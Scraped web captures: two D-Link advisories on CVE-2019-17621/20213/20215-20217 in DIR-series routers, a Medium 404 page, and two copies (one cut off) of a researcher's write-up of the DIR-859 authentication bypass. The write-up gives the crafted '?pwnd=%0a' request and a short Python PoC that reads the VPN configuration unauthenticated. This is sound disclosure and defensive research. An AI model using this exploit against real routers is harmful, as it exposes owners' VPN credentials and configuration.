=== Content from medium.com_ebfe57ac_20250121_021030.html ===
[Open in app](https://rsci.app.link/s1cSf8zJT3?%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-unauthenticated-information-disclosu&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-unauthenticated-information-disclosu&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)PAGE NOT FOUND
## 404

## Out of nothing, something.

You can find (just about) anything on Medium — apparently even a page that doesn’t exist. Maybe these stories will take you somewhere new?[Home](/)[#### The “nine-word problem” of civil rights discourse](https://blog.medium.com/the-nine-word-problem-of-civil-rights-discourse-3ffb826782db)[![The Medium Newsletter](https://miro.medium.com/v2/resize:fill:80:80/1*K9W37C71uESVlmKnN2Z4KA.jpeg)](/%40dailynewsletter)[The Medium Newsletter](/%40dailynewsletter)[in The Medium Blog](https://blog.medium.com)Jan 20, 2025·3 min read[#### The “nine-word problem” of civil rights discourse](https://blog.medium.com/the-nine-word-problem-of-civil-rights-discourse-3ffb826782db)[![The Medium Newsletter](https://miro.medium.com/v2/resize:fill:80:80/1*K9W37C71uESVlmKnN2Z4KA.jpeg)](/%40dailynewsletter)[The Medium Newsletter](/%40dailynewsletter)[in The Medium Blog](https://blog.medium.com)Jan 20, 2025·3 min read[#### Rest in Peace David Lynch](/picture-palace/rest-in-peace-david-lynch-9ecdf2456cc4)[![Loren Kantor](https://miro.medium.com/v2/resize:fill:80:80/2*AYFl0yHt2NpEBjMsGoUzMw.png)](/%40lorenwoodcuts)[Loren Kantor](https://lorenwoodcuts.medium.com)[in Picture Palace](/picture-palace)Jan 19, 2025·5 min read

Member-only

[#### Rest in Peace David Lynch](/picture-palace/rest-in-peace-david-lynch-9ecdf2456cc4)[![Loren Kantor](https://miro.medium.com/v2/resize:fill:80:80/2*AYFl0yHt2NpEBjMsGoUzMw.png)](/%40lorenwoodcuts)[Loren Kantor](https://lorenwoodcuts.medium.com)[in Picture Palace](/picture-palace)Jan 19, 2025·5 min read

Member-only

[#### Buy Once, Cry Once: The $2,000 Kitchen Knife Lesson](/at-home-publication/buy-once-cry-once-the-2-000-kitchen-knife-lesson-7775b88d2871)[![Mark Laflamme](https://miro.medium.com/v2/resize:fill:80:80/1*7_fqqdY0kKmjoPs5Q5Zqrg.jpeg)](/%40laflamme)[Mark Laflamme](/%40laflamme)[in At Home](/at-home-publication)Jan 17, 2025·10 min read

Member-only

[#### Buy Once, Cry Once: The $2,000 Kitchen Knife Lesson](/at-home-publication/buy-once-cry-once-the-2-000-kitchen-knife-lesson-7775b88d2871)[![Mark Laflamme](https://miro.medium.com/v2/resize:fill:80:80/1*7_fqqdY0kKmjoPs5Q5Zqrg.jpeg)](/%40laflamme)[Mark Laflamme](/%40laflamme)[in At Home](/at-home-publication)Jan 17, 2025·10 min read

Member-only

[#### Your house burned down in a wildfire — now what?](/%40ajounisingh/your-house-burned-down-in-a-wildfire-now-what-ffd9771d3b9f)[![Ajounisingh](https://miro.medium.com/v2/resize:fill:80:80/1*dmbNkD5D-u45r44go_cf0g.png)](/%40ajounisingh)[Ajounisingh](/%40ajounisingh)Jan 20, 2025·8 min read[#### Your house burned down in a wildfire — now what?](/%40ajounisingh/your-house-burned-down-in-a-wildfire-now-what-ffd9771d3b9f)[![Ajounisingh](https://miro.medium.com/v2/resize:fill:80:80/1*dmbNkD5D-u45r44go_cf0g.png)](/%40ajounisingh)[Ajounisingh](/%40ajounisingh)Jan 20, 2025·8 min read



=== Content from supportannouncement.us.dlink.com_5f8b64ac_20250121_000114.html ===


Search by product, keyword, model.

* [Home](http://us.dlink.com/)
  [Support](http://support.dlink.com/index.aspx)
  [Forums](http://forums.dlink.com)
  [Security Advisories](http://support.dlink.com/securityadvisories.aspx)
  [Shop](https://shop.us.dlink.com/)
  US
  ![](https://supportannouncement.us.dlink.com/images/US.gif)
  English
  []

      English | French

Support Announcement

Announcement
>
SAP10147

DIR-818Lx Rev Bx / DIR-822 Rev Bx & Cx /DIR-823 Rev Ax / DIR-859 Rev Ax / DIR-865L Rev Ax / DIR-868L Rev Ax & Bx / DIR-869 Rev Ax / DIR-880L Rev Ax / DIR-885L Rev Ax / DIR-890L Rev Ax / DIR-895L Rev Ax :: CVE-2019-17621 :: Unauthenticated remote command execution (RCE) :: CVE-2019-20213 :: Information Disclosure :: CVE-2019-20215/20216/20217 :: RCE via UPnP ssdpcfgi() LAN-side vulnerabilities

 **Overview**

This announcement is an extension of a third-party report involving the DIR-859 Rev. Ax. D-Link confirmed and released patches j([HERE](http://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10146)) for this report, and it has public disclosure as CVE-2019-17621 ([HERE](https://nvd.nist.gov/vuln/detail/CVE-2019-17621)) and CVE-2019-20213 ([HERE](https://nvd.nist.gov/vuln/detail/CVE-2019-20213)).

On November 5, 2019, the same third party reported their original report and related public disclosure of CVE-2019-20215 ([HERE](https://nvd.nist.gov/vuln/detail/CVE-2019-20215)), CVE-2019-20216 ([HERE)](https://nvd.nist.gov/vuln/detail/CVE-2019-20216), and CVE-2019-20217 ([HERE](https://nvd.nist.gov/vuln/detail/CVE-2019-20217)) may also involve other devices which D-Link also discovered and confirmed through its security process:

* DIR-818Lx Bx firmware v2.05b03\_Beta08
* DIR-822 Cx firmware v3.12b04
* DIR-822 Bx firmware v2.03b01
* DIR-823 Ax firmware v1.00b06\_Beta
* DIR-859 Ax firmware v1.06b01\_Beta01
* DIR-865L Ax firmware v1.07.b01
* DIR-868L Ax firmware v1.12b04
* DIR-868L Bx firmware v2.05b02
* DIR-869 Ax firmware v1.03b02\_Beta02
* DIR-880L Ax firmware v1.08b04
* DIR-890L Ax firmware v1.11b01\_Beta01
* DIR-885L Ax firmware v1.12b05
* DIR-895L Ax firmware v1.12b10

The original security vulnerability, filed under CVE-2019-17621 and CVE-2019-20213, the DIR-859 Rev. Ax device firmware may allow a malicious user an unauthenticated, remote command execution on the device's LAN-Side (in-home) connections. Additional related research filed under CVE-2019-20215, CVE-2019-20216, and CVE-2019-20217 reported unauthenticated command execution in the device firmware via the device's ssdpcgi() CGI interpreter.

Many of the models listed in this security-related reports have reached their End of Support (“EOS”) / End of Life (“EOL”) Life-cycle dates. As a general policy, when the product reaches EOS/EOL, it can no longer be supported, and all firmware development for the product ceases, except in certain unique situations. In these EOS/EOL exceptional cases, D-Link was able to provide a Firmware Beta Patch Release after the EOS/EOL Date. **Please see the information and recommendations**below.

D-Link takes the issues of network security and user privacy very seriously. We have a dedicated task force and product management team on call to address evolving security issues and implement appropriate security measures.

 **Third-Party Report**

     Miguel Mendez Z. — (s1kr10s) - Research Center at Telefónica Chile

     Pablo Pollanco — (secenv)  - Research Center at Telefónica Chile

**CVE-ID Public Disclosure**

* [CVE-2019-17621](https://nvd.nist.gov/vuln/detail/CVE-2019-17621)  UPnP  /gena.cgi in the D-Link DIR-859 firmware v1.05 &v1.06B01 Beta01 allows an unauthenticated command execution
* [CVE-2019-20213](https://nvd.nist.gov/vuln/detail/CVE-2019-20213)  D-Link DIR-859 firmware v1.07b03\_beta allows unauthenticated information disclosure
* [C](https://nvd.nist.gov/vuln/detail/CVE-2019-20215)[VE-2019-20215](https://nvd.nist.gov/vuln/detail/CVE-2019-20215)  D-Link DIR-859 firmware v1.05 & v1.06B01 Beta01 devices allow unauthenticate command execution
* [CVE-2019-20216](https://nvd.nist.gov/vuln/detail/CVE-2019-20216)  D-Link DIR-859 firmware v1.05 & v1.06B01 Beta01 devices allow unauthenticate command execution
* [CVE-2019-20217](https://nvd.nist.gov/vuln/detail/CVE-2019-20217)  D-Link DIR-859 firmware v1.05 & v1.06B01 Beta01 devices allow unauthenticate command execution

**Affected Products**

There is a mix of End-Of-Service Life products and active Life-Cycle products regarding this security issue. Please see below for End-of-Service Life products.

For active products to close this, you can download the patch and upgrade it through the device's web-configuration GUI.

| Model | HW Rev. | Region | Affected FW | Fixed FW | Recommendation | Info Last Update | **EoS/EoL Info** |
| --- | --- | --- | --- | --- | --- | --- | --- |
| DIR-818Lx | All Bx Revisions | US | v2.05b03\_Beta08 & older | [v2.06b02 Hotfix](http://legacyfiles.us.dlink.com/DIR-818LW/REVB/DIR-818LW_REVB_FIRMWARE_v2.06B02_HOTFIX.zip) | Please download & upgrade | 01/20/2020 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=7de8b67be2cb493f91d70f12f7ce43c9) |
| DIR-822 | All Bx Revisions | Non-US | v2.03b01 & older | v2.04b02beta01 Hotfix | Please download & upgrade | 01/22/2020 | Not Applicable |
| DIR-822 | All Cx Revisions | US | v3.12b04 & older | v3.15b03 Hotfix | Please download & upgrade | 11/22/2019 | None/Active SKU |
| DIR-823 | All Ax Revisions | Non-US | v1.00b06\_Beta & older | v1.03b03betab01 Hotifx | Please download & upgrade | 12/27/2019 | Not Applicable |
| DIR-859 | All Ax Revisions | US | v1.06b01Beta01 & older | [v1.07b03 beta Hotfix](http://legacyfiles.us.dlink.com/DIR-859/REVA/FIRMWARE/DIR-859_REVA_FIRMWARE_1.07B03_HOTFIX.zip) | Please download & upgrade | 11/23/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=a64612142a3041d98642960e5f840fb6) |
| DIR-865L | All Ax Revisions | US | v1.07b01 & older | EOL / Not Supported | Please See Below | 11/23/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=5de2fe63340d4a258ce7d873b3459707) |
| DIR-868L | All Ax Revisions | US | v1.12b04 & older | [v1.20b07 Hotfix](http://legacyfiles.us.dlink.com/DIR-868L/REVA/FIRMWARE/DIR-868L_REVA_FIRMWARE_1.20B07_HOTFIX.zip) | Please download & upgrade | 12/06/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=20c2a92f049347979d556b47b4056a6b) |
| DIR-868L | All Bx Revisions | Non-US | v2.05b02 & older | [v2.20b02beta01 Hotfix](http://legacyfiles.us.dlink.com/DIR-868L/REVB/FIRMWARE/DIR-868L_REVB_FIRMWARE_v2.20B02_BETA01_HOTFIX.zip) | Please download & upgrade | 12/18/2019 | Not Applicable |
| DIR-869 | All Ax Revisions | US | v1.03b02Beta02 & older | v1.04b03beta01 Hotfix | Please download & upgrade | 12/23/2019 | None/Active SKU |
| DIR-880L | All Ax Revisions | US | v1.08b04 & older | [v1.20b03beta01 Hotfix](http://legacyfiles.us.dlink.com/DIR-880L/REVA/FIRMWARE/DIR-880L_REVA_FIRMWARE_1.20B03_BETA01_HOTFIX.zip) | Please download & upgrade | 01/06/2020 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=52f29b2b2bf245d199176469a277b8e1) |
| DIR-890L/R | All Ax Revisions | US | v1.11b01\_Beta01 & older | [v1.21b04\_Hotfix](http://legacyfiles.us.dlink.com/DIR-890L/REVA/FIRMWARE/DIR-890L_REVA_FIRMWARE_1.21B04_HOTFIX.zip) | Please download & upgrade | 01/13/2020 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=d4b79b4434754f769d12ef58aab4d8e7) |
| DIR-885L/R | All Ax Revisions | US | v1.12b05 & older | [v1.21b03\_Hotfix](http://legacyfiles.us.dlink.com/DIR-885L/REVA/FIRMWARE/DIR-885L_REVA_FIRMWARE_1.21B03_HOTFIX.zip) | Please download & upgrade | 12/09/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=917816fe412e4ef2ada6113374a795b0) |
| DIR-895L/R | All Ax Revisions | US | v1.12b10 & older | [v1.21b05\_Hotfx](http://legacyfiles.us.dlink.com/DIR-895L/REVA/FIRMWARE/DIR-895L_REVA_FIRMWARE_v1.21B05_HOTFIX.zip) | Please download & upgrade | 12/16/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=44d530b08c9d4cc58259bab295edc2ec) |

**Note:** Some routers must be updated twice to close this security issue. If you download the fixed firmware, and there are two firmware .BIN files in the ZIP-file, then the two-step update is required. First, update the device from the Device Web-GUI using {Model-Device-Firmware} \_**middle\_STEP\_01.bin**. Second, update the device from **the** device from the Web-GUI using {Model-Devic**e-Firmware\_STEP\_02**}.bin.

**Recommendation for End of Support Life Products**

From time to time, D-Link will decide that some of its products have reached End of Support ("EOS") / End of Life ("EOL"). D-Link may choose to EOS/EOL an effect due to the evolution of technology, market demands, innovations, product efficiencies based on new technologies, or the product matures over time and should be replaced by functionally superior technology.

**For US Consumer**

If a product has reached End of Support ("EOS") / End of Life ("EOL"), there is usually no further extended support or development for it. Once a product reaches its EOL/EOS date, all files post regarding the devices are moved to  <https://legacy.us.dlink.com/> as the final information archive for the device..

Typically for these products, D-Link will not resolve device or firmware issues since all development and customer support have ceased.

* [Contact Us](http://support.dlink.com/Search.aspx)
* Do Not Sell My Info – CA Residents Only
* Privacy
* Terms of Use
* End of Product Life-Cycle
* [GPL Source Code](http://tsd.dlink.com.tw/gpl2008.asp)



=== Content from medium.com_97cec5fa_20250121_000111.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Ffaf1a9a13f3f&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# D-Link DIR-859 — Unauthenticated Information Disclosure (CVE-2019–20213)

[![Miguel Méndez Z.](https://miro.medium.com/v2/resize:fill:88:88/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](/%40s1kr10s?source=post_page---byline--faf1a9a13f3f--------------------------------)

[Miguel Méndez Z.](/%40s1kr10s?source=post_page---byline--faf1a9a13f3f--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F691af447be50&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f&user=Miguel+M%C3%A9ndez+Z.&userId=691af447be50&source=post_page-691af447be50--byline--faf1a9a13f3f---------------------post_header-----------)

4 min read·Dec 23, 2019

--

Listen

Share

# Researchers

* Miguel Mendez Z. — (s1kr10s)
* Pablo Pollanco — (secenv)

# Technical Details

* Model : DIR-859
* Firmware Version: 1.06b01 Beta01, 1.05
* Architecture: MIPS 32 bit

# Vulnerability

* Remote Unauthenticated Information Disclosure via WAN and LAN

# Affected Products

![]()
# Vulnerability analysis

The phpcgi\_main() function is executed as the entry point of the phpcgi binary (which, in reality, is a symbolic link to the binary /htdocs/cgibin). This function processes all HTTP requests of type HEAD, GET or POST, whose file extension requested are php, asp, etc. Also, it obtains and processes the parameters set in the URL, creating strings (in the form “KEY=value”) and passing them to the PHP interpreter.

Due to a mistake in the processing of the request body, it is possible to bypass the authentication required by the device when accessing certain PHP files, by sending a specially crafted HTTP request, as shown below:

```
KEY can be HEAD, GET o POST
Value is a string value terminated in a new line, "\n"
URL Path: /vpnconfig.php?pwnd=%0a
```
![]()

main function

The image shows the structure in flowgraph mode of the phpcgi\_main() function, where the green colored boxes are the path to follow to reach the vulnerable code (purple box).

![]()

phpcgi\_main() function

To start the analysis, we must debug the binary “/htdocs/cgibin”. For this we use QEMU as emulator, and a decompiler to taste. In our case we use IDA.

We start the following script with the defined values as shown, so the process is run under the debugger.

![]()

debugging method

We insert a breakpoint in phpcgi\_main(), as seen in the following image. Here we focus on the cgibin\_parse\_request() function, which checks for the existence of header values such as CONTENT\_LENGTH and CONTENT\_TYPE, in addition to making a call to parse\_uri().

![]()

url validation

The parse\_uri() function checks that the URL contains the character “?”, and orders the structure of the URL being sent. At this point we can find in memory the value we control (AUTHORIZED\_GROUP=1%0a).

![]()

controlled value

Upon returning the execution from cgibin\_parse\_request() to phpcgi\_main(), some variables are initialized. Then the sess\_validate() function is executed, which returns a negative value 0xffffffff (-1 in decimal), assigning that value to the “AUTHORIZED\_GROUP” parameter.

![]()

data copy with sprintf()

![]()

return value 0xffffffff

Following the analysis of the routine, we can see how the information we send is sorted by functions (sobj\_add\_string, sobj\_add\_char, sobj\_get\_string) using the register $a0, which is used as a ptr\_buffer pointer formatting variables, leaving $a0 as an argument of xmldbc\_ephp( ) for final validation.

![]()

copy and send structure

After the last copy with sobj\_get\_string, you can observe in memory how the AUTHORIZED\_GROUP variable is with the value that we control.

![]()

memory

With this, the PHP code will then be executed, seting the variable “AUTHORIZED\_GROUP” as 1, with which we are authorized to read the configuration of the VPN (bottom table of the following image).

![]()

vpnconfig.php file

After executing a simple curl with a valid payload, we get the stored configuration of the vpnconfig.php file.

![]()

configuration result

# Exploit PoC

```
import requests
# Miguel Mendez Z.FILES = ["vpnconfig.php"]
IP = "192.168.0.1"
PORT = "80"headers = {'content-type': 'application/x-www-form-urlencoded'}print "\n-----------VPN-------------\n"
url_vpn = 'http://{ip}:{port}/{file1}?pwnd=%0a'.format(ip=IP, port=PORT, file1=FILES[0])
print(requests.get(url_vpn).text)
```
# Video

**Dlink**: <https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10147>

By3…

[Exploitation](/tag/exploitation?source=post_page-----faf1a9a13f3f--------------------------------)[IoT](/tag/iot?source=post_page-----faf1a9a13f3f--------------------------------)

--

--

[![Miguel Méndez Z.](https://miro.medium.com/v2/resize:fill:96:96/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](/%40s1kr10s?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)[![Miguel Méndez Z.](https://miro.medium.com/v2/resize:fill:128:128/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](/%40s1kr10s?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)Follow[## Written by Miguel Méndez Z.](/%40s1kr10s?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)[142 Followers](/%40s1kr10s/followers?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)·[45 Following](/%40s1kr10s/following?source=post_page---post_author_info--faf1a9a13f3f--------------------------------)

<https://s1kr10s.github.io/whoami.html> — @s1kr10s

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----faf1a9a13f3f--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----faf1a9a13f3f--------------------------------)[About](/about?autoplay=1&source=post_page-----faf1a9a13f3f--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----faf1a9a13f3f--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----faf1a9a13f3f--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----faf1a9a13f3f--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----faf1a9a13f3f--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----faf1a9a13f3f--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----faf1a9a13f3f--------------------------------)[Teams](/business?source=post_page-----faf1a9a13f3f--------------------------------)



=== Content from supportannouncement.us.dlink.com_33b81be4_20250121_000113.html ===


Search by product, keyword, model.

* [Home](http://us.dlink.com/)
  [Support](http://support.dlink.com/index.aspx)
  [Forums](http://forums.dlink.com)
  [Security Advisories](http://support.dlink.com/securityadvisories.aspx)
  [Shop](https://shop.us.dlink.com/)
  US
  ![](https://supportannouncement.us.dlink.com/images/US.gif)
  English
  []

      English | French

Support Announcement

Announcement
>
SAP10146

DIR-859 :: Ax :: FW v1.06b01\_Beta01 and older :: CVE-2019–17621 :: Unauthenticated Remote Code Execution and CVE-2019-20213:: information Disclosure LAN-Side Security Vulnerability

**Overview**

**Critical Update:** On December 26,2019 the scope of this was expended to include additional models referenced [HERE](https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10147).

On October 16, 2019, third party security experts accused the DIR-859 using the latest available firmware v1.06b01\_Beta01 of having a security vulnerability that allowed a malicious user an unathenticated remote command execution on the LAN-Side (in-home) filed under CVE-2019-17621 and CVE-2019-20213. Additional releated research discovered CVE-2019-20215, CVE-2019-20216, and CVE-2019-20217 that are UPnP RCE in MSEARCH via the ssdpcgi() cgi interpreter.

In order for this security exploit to be done a malicious user would have to get access to the LAN-side or in-home access to the device which narrows the risk of an attack considerably. Regardless we appreicate the 3rd parties report, confirmmed and released patches to close this issue.

D-Link takes the issues of network security and user privacy very seriously. We have a dedicated task force and product management team on call to address evolving security issues and implement appropriate security measures.

**Disclosure**

  **3rd Party Security Expertise**

- Miguel Mendez Z. — (s1kr10s) - Research Center at Telefónica Chile

          - Pablo Pollanco — (secenv)   - Research Center at Telefónica Chile

**-  CVE-2019-17621 ::**

             - (English) [https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f](https://medium.com/%40s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f)

             - (English) [https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104](https://medium.com/%40s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104)

             - (Spanish) [https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-es-fad716629ff9](https://medium.com/%40s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-es-fad716629ff9)

**-  CVE-2019-20213 ::**

- (English) [https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f](https://medium.com/%40s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f)

             - (Spanish) [https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-es-6540f7f55b03](https://medium.com/%40s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-es-6540f7f55b03)

**-  CVE-2019-20215 ::**

- (English) [https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73](https://medium.com/%40s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73)

 - (English) <https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2019-20215>

             - (Spanish) [https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-en-ssdpcgi-http-st-cve-2019-20215-es-6ec205f5cf](https://medium.com/%40s1kr10s/d-link-dir-859-unauthenticated-rce-en-ssdpcgi-http-st-cve-2019-20215-es-6ec205f5cf)

**-  CVE-2019-20216 ::**

 - (English) <https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2019-20216>

            - (Spanish) [https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-en-remote-port-29820d9f0f58](https://medium.com/%40s1kr10s/d-link-dir-859-rce-unautenticated-en-remote-port-29820d9f0f58)

**-  CVE-2019-20217 ::**

- (English) <https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2019-20217>

            - (Spanish) [https://medium.com/@s1kr10s/d-link-dir-859-rce-unauthenticated-en-server-id-e11ca6168d35](https://medium.com/%40s1kr10s/d-link-dir-859-rce-unauthenticated-en-server-id-e11ca6168d35)

 **Affected Products**

Currently, the following D-Link brand devices are affected:

| Model | HW Rev. | Region | Affected FW | Fixed FW | Current FW | Recommendation | Info Last Update |
| --- | --- | --- | --- | --- | --- | --- | --- |
| DIR-859 | All Ax HW Rev | US | v1.06b01Beta01 and older | [v1.07b03\_beta\*\*](https://www.dropbox.com/s/noo73atafzukush/19-1224-DIR-859_FW107_TwinFwUpgate.zip?dl=0) | [v1.07b03\_beta\*\*](https://www.dropbox.com/s/noo73atafzukush/19-1224-DIR-859_FW107_TwinFwUpgate.zip?dl=0) | Please download  & upgrade device | 12/26/2019 |

**\*\*Note:** You must update your router twice to close this security issue. First update the device from the Device Web-GUI using DIR859\_FW107b02beta01\_20190125\_j1o9\_middle.bin. Second update the device from theD Device Web-GUI using DIR859\_FW107b03\_jbli\_beta.bin.

**Notice for US consumter:**

Beta veriosns of firmware must meet security spot checks for the issue the Beta version is to address.  This allows us to disclose and provide a fix sooner for our technical users that understand how to manually update the device or call our customer care center for further help.  A fully qualified firmware will come at a later time that meets the full suite fo quality and security software testing we maintain under D-Link Systems, Inc. Comprehensive Software Security program.

Security patch for your D-Link Devices

This firmware is an update security vulnerabilities in affected D-Link devices. D-Link will update this continually and we strongly recommend all users to install this relevant updates.

As there are different hardware revisions on our products, please check this on your device before downloading the correct corresponding firmware update. The hardware revision information can usually be found on the product label on the underside of the product next to the serial number. Alternatively, they can also be found on the device web configuration.

* [Contact Us](http://support.dlink.com/Search.aspx)
* Do Not Sell My Info – CA Residents Only
* Privacy
* Terms of Use
* End of Product Life-Cycle
* [GPL Source Code](http://tsd.dlink.com.tw/gpl2008.asp)



=== Content from medium.com_53355f7d_20250121_021029.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Ffaf1a9a13f3f&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# D-Link DIR-859 — Unauthenticated Information Disclosure (CVE-2019–20213)

[![Miguel Méndez Z.](https://miro.medium.com/v2/resize:fill:88:88/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](/%40s1kr10s?source=post_page---byline--faf1a9a13f3f--------------------------------)

[Miguel Méndez Z.](/%40s1kr10s?source=post_page---byline--faf1a9a13f3f--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F691af447be50&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f&user=Miguel+M%C3%A9ndez+Z.&userId=691af447be50&source=post_page-691af447be50--byline--faf1a9a13f3f---------------------post_header-----------)

4 min read·Dec 23, 2019

--

Listen

Share

# Researchers

* Miguel Mendez Z. — (s1kr10s)
* Pablo Pollanco — (secenv)

# Technical Details

* Model : DIR-859
* Firmware Version: 1.06b01 Beta01, 1.05
* Architecture: MIPS 32 bit

# Vulnerability

* Remote Unauthenticated Information Disclosure via WAN and LAN

# Affected Products

![]()
# Vulnerability analysis

The phpcgi\_main() function is executed as the entry point of the phpcgi binary (which, in reality, is a symbolic link to the binary /htdocs/cgibin). This function processes all HTTP requests of type HEAD, GET or POST, whose file extension requested are php, asp, etc. Also, it obtains and processes the parameters set in the URL, creating strings (in the form “KEY=value”) and passing them to the PHP interpreter.

Due to a mistake in the processing of the request body, it is possible to bypass the authentication required by the device when accessing certain PHP files, by sending a specially crafted HTTP request, as shown below:

```
KEY can be HEAD, GET o POST
Value is a string value terminated in a new line, "\n"
URL Path: /vpnconfig.php?pwnd=%0a
```
![]()

main function

The image shows the structure in flowgraph mode of the phpcgi\_main() function, where the green colored boxes are the path to follow to reach the vulnerable code (purple box).

![]()

phpcgi\_main() function

To start the analysis, we must debug the binary “/htdocs/cgibin”. For this we use QEMU as emulator, and a decompiler to taste. In our case we use IDA.

We start the following script with the defined values as shown, so the process is run under the debugger.

![]()

debugging method

We insert a breakpoint in phpcgi\_main(), as seen in the following image. Here we focus on the cgibin\_parse\_request() function, which checks for the existence of header values such as CONTENT\_LENGTH and CONTENT\_TYPE, in addition to making a call to parse\_uri().

![]()

url validation

The parse\_uri() function checks that the URL contains the character “?”, and orders the structure of the URL being sent. At this point we can find in memory the value we control (AUTHORIZED\_GROUP=1%0a).

![]()

controlled value

Upon returning the execution from cgibin\_parse\_request() to phpcgi\_main(), some variables are initialized. Then the sess\_validate() function is executed, which returns a negative value 0xffffffff (-1 in decimal), assigning that value to the “AUTHORIZED\_GROUP” parameter.

![]()

data copy with sprintf()

![]()

return value 0xffffffff

